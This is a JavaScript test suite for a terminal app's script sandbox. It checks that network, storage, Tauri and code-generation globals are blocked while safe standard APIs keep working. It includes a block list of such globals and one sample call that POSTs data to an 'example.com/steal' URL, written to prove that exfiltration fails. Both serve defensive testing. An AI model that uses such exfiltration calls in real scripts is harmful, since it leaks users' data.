import assert from "node:assert/strict";
import test from "node:test";
import { SCRIPT_RUN_STATUS, runScript } from "../src/services/scripting/scriptRunner.js";
import { publishTerminalOutput, registerScriptBridge } from "../src/services/scripting/bridges.js";

const TARGET = "sandbox-session";

function createFakeBridge() {
  const listeners = new Set();
  return {
    sent: [],
    bufferText: "",
    send(data) {
      this.sent.push(data);
      return true;
    },
    getScreenText: () => "",
    getBufferText() {
      return this.bufferText;
    },
    notifyOutput(data) {
      for (const listener of [...listeners]) listener(data);
    },
    onOutput(listener) {
      listeners.add(listener);
      return () => listeners.delete(listener);
    },
  };
}

let unregister = null;

function setup() {
  unregister = registerScriptBridge(TARGET, createFakeBridge());
}

function teardown() {
  unregister?.();
  unregister = null;
}

function testContext() {
  return { targetSessionId: TARGET, targetLabel: "Sandbox" };
}

// 访问被禁全局的任何属性/调用都应让脚本以"沙盒禁用"错误结束。
const BLOCKED_GLOBALS = [
  "fetch",
  "XMLHttpRequest",
  "WebSocket",
  "EventSource",
  "Worker",
  "BroadcastChannel",
  "importScripts",
  "__TAURI__",
  "__TAURI_INTERNALS__",
  "__TAURI_METADATA__",
  "window",
  "self",
  "globalThis",
  "document",
  "top",
  "parent",
  "frames",
  "opener",
  "location",
  "history",
  "navigator",
  "screen",
  "localStorage",
  "sessionStorage",
  "indexedDB",
  "caches",
  "Function",
  "require",
  "module",
  "process",
  "alert",
  "confirm",
  "prompt",
  "open",
  "close",
  "postMessage",
  "Notification",
  "SharedArrayBuffer",
];

test("sandboxed globals throw a naming error on any access", async () => {
  setup();
  for (const name of BLOCKED_GLOBALS) {
    const run = await runScript(
      {
        id: `blocked-${name}`,
        name: `blocked-${name}`,
        code: `void (${name}).anything;`,
      },
      testContext(),
    );
    assert.equal(run.status, SCRIPT_RUN_STATUS.ERROR, `${name} should be blocked`);
    assert.match(run.error, /沙盒|sandbox/i, `${name} error should mention the sandbox`);
    assert.ok(run.error.includes(name), `${name} error should name the blocked api`);
  }
  teardown();
});

test("calling a blocked global also throws (not just property access)", async () => {
  setup();
  const run = await runScript(
    {
      id: "blocked-call",
      name: "blocked-call",
      code: `await fetch("https://example.com/steal", { method: "POST", body: "x" });`,
    },
    testContext(),
  );
  teardown();
  assert.equal(run.status, SCRIPT_RUN_STATUS.ERROR);
  assert.match(run.error, /沙盒|sandbox/i);
  assert.ok(run.error.includes("fetch"));
});

test("direct eval still resolves globals through the sandbox scope", async () => {
  setup();
  const run = await runScript(
    {
      id: "blocked-direct-eval",
      name: "blocked-direct-eval",
      // 直接 eval 继承当前作用域：fetch 依旧命中沙盒屏蔽值。
      code: `eval("fetch('/x')");`,
    },
    testContext(),
  );
  teardown();
  assert.equal(run.status, SCRIPT_RUN_STATUS.ERROR);
  assert.match(run.error, /沙盒|sandbox/i);
});

test("new Function() code generation is blocked", async () => {
  setup();
  const run = await runScript(
    {
      id: "blocked-function-ctor",
      name: "blocked-function-ctor",
      code: `new Function("return 1")();`,
    },
    testContext(),
  );
  teardown();
  assert.equal(run.status, SCRIPT_RUN_STATUS.ERROR);
  assert.match(run.error, /沙盒|sandbox/i);
});

test("safe standard globals remain available inside the sandbox", async () => {
  setup();
  const run = await runScript(
    {
      id: "sandbox-allowed",
      name: "sandbox-allowed",
      code: `
        const url = new URL("https://example.com/a?b=1");
        const text = new TextDecoder().decode(new TextEncoder().encode("héllo"));
        xterm.log(url.searchParams.get("b"), text, atob("aGk="), structuredClone({ ok: 1 }).ok);
        xterm.log(typeof JSON, typeof Math, typeof Promise, typeof Map, typeof crypto?.getRandomValues === "undefined" ? "skip" : "crypto");
      `,
    },
    testContext(),
  );
  teardown();
  assert.equal(run.status, SCRIPT_RUN_STATUS.DONE);
  assert.equal(run.logs[0].text, "1 héllo hi 1");
});

test("console/timers provided by the runtime are not shadowed by the sandbox", async () => {
  setup();
  const run = await runScript(
    {
      id: "sandbox-runtime-scope",
      name: "sandbox-runtime-scope",
      code: `
        console.log("via-console");
        await new Promise((resolve) => setTimeout(resolve, 5));
        xterm.log("timers-ok");
      `,
    },
    testContext(),
  );
  teardown();
  assert.equal(run.status, SCRIPT_RUN_STATUS.DONE);
  assert.equal(run.logs[0].text, "via-console");
  assert.equal(run.logs[1].text, "timers-ok");
});

test("oversized log arguments are truncated instead of stored whole", async () => {
  setup();
  const run = await runScript(
    {
      id: "log-truncation",
      name: "log-truncation",
      code: `xterm.log("x".repeat(64 * 1024));`,
    },
    testContext(),
  );
  teardown();
  assert.equal(run.status, SCRIPT_RUN_STATUS.DONE);
  assert.ok(run.logs[0].text.length <= 8 * 1024 + 1);
  assert.ok(run.logs[0].text.endsWith("…"));
});

test("terminal interaction still works under the sandbox", async () => {
  setup();
  const runPromise = runScript(
    {
      id: "sandbox-terminal",
      name: "sandbox-terminal",
      code: `
        await xterm.sendLine("show version");
        const matched = await xterm.waitFor("Version 1.0", 2000);
        xterm.log("matched", matched);
      `,
    },
    testContext(),
  );
  await new Promise((resolve) => setTimeout(resolve, 20));
  publishTerminalOutput(TARGET, "Software Version 1.0\r\n");
  const run = await runPromise;
  teardown();
  assert.equal(run.status, SCRIPT_RUN_STATUS.DONE);
  assert.equal(run.logs[0].text, "matched Version 1.0");
});
